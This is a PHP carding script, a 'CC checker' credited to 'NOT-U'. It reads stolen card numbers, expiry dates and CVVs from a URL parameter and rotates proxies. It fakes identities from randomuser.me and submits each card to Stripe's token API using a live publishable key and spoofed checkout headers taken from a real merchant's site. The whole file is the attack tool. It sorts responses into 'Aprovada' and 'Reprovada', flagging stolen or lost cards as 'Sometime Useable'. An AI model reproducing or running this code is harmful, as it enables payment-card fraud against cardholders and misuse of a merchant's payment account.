<?php

#---------------[ RECOMPILED BY NOT-U ]---------------#

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function proxys()
{
  $poxyHttps = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxyHttps) - 1);
  $poxyHttps = $poxyHttps[$myproxy];
  return $poxyHttps;
}
$poxyHttp = proxys();

#---------------[ RANDOMUSR AUTH ]---------------#

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

#---------------[ 1ST AUTH ]---------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxyHttp);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=9047b170-91de-1f3e-d5dd-4a470b00f0d2',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.brudevalsen.dk%2F%23priser&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&time_on_page=45258&guid=4c659789-a766-4a1b-9992-caaa11237936&muid=bc19e001-5fef-4978-ae35-415e461c3644&sid=aaa79888-c0db-4278-a243-bfc299603f72&key=pk_live_YN7RAel3TnchAP8MvR2oSM2Y00WH6ndzGR');
$result = curl_exec($ch);

#---------------[ CARD RESPONSE ]---------------#

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">CVC MATCHED</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif (strpos($result, '"status":"success"')) { 
    echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">CVC MATCHED</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>'; 
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">CVC MATCHED</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">CVC MATCHED</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">CCN LIVE</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">CCN LIVE</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-success">CVC MATCHED - Incorrect Zip</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">Stolen_Card - Sometime Useable</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">Lost_Card - Sometime Useable</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">Insufficient Funds</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Card Expired</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">Aprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">  </span> <span class="badge badge-info">Pickup Card_Card - Sometime Useable</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Incorrect Card Number</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Incorrect Card Number</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Generic_Decline</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Do_Not_Honor</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Security Code Unchecked</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Security Code Check : Fail</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Expired Card</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <span class="badge badge-info">Card Doesnt Support This Purchase</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span></br>';
}
 else {
  echo '<span class="badge badge-danger">Reprovada</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp'. $lista .'&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-info">Proxy Dead</span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<span class="badge badge-warning">iNS4N3E</span> </br>';
}

curl_close($ch);
ob_flush();

#---------------[ RECOMPILED BY NOT-U ]---------------#

?>